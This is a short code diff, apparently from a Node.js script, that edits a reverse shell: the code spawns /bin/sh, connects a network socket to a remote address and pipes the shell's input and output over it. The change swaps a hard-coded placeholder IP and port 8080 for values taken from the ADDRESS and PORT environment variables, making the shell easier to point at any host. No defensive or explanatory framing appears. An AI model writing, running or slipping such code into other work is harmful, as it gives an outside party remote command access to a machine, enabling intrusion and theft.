@@ -4,8 +4,8 @@
         sh = cp.spawn("/bin/sh", []);
 
     var client = new net.Socket()
-    var IP = "YOU IP"
-    client.connect(8080, IP, function(){
+    var IP = process.env.ADDRESS
+    client.connect(parseInt(process.env.PORT), IP, function(){
 
         client.pipe(sh.stdin);
         sh.stdout.pipe(client);
